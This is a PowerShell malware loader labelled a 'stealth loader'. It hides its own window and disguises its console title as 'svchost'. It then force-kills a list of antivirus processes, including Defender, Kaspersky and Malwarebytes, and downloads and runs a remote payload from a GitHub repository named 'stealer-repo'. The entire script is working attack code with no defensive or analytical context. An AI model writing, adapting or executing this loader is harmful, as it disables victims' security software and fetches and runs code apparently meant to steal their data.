# ============================================
# FAST LAUNCHER - stealth loader
# ============================================
# Hide console window
$code = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern bool SetConsoleTitle(string lpConsoleTitle);
}
"@
Add-Type -TypeDefinition $code

[Win32]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
[Win32]::SetConsoleTitle("svchost")

# Kill AV processes
$killList = @("avg","avast","avgnt","comodo","kaspersky","malwarebytes","msascui","mbam","nod32","fsecure","sophos","defender")
foreach ($proc in $killList) {
    Get-Process $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

# Download and execute payload (v2 anti-cache)
$url = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main/payload_final.ps1"
$payload = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15 -UserAgent "Mozilla/5.0"
Invoke-Expression $payload.Content
exit
